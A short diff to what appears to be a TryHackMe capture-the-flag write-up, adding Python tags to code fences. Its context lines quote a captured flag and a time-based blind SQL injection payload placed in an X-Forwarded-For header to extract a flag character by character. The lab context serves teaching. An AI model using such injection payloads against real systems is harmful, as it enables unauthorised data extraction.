@@ -235,7 +235,7 @@ Flag found:  THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
 X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,2,1))) = '72'); --+
 ```
 
-```
+```py
 message = ""
 
   
@@ -261,7 +261,7 @@ with open("data.txt") as f:
 print("Decoded message:", message)
 ```
 
-```
+```py
 import requests
 
 import time
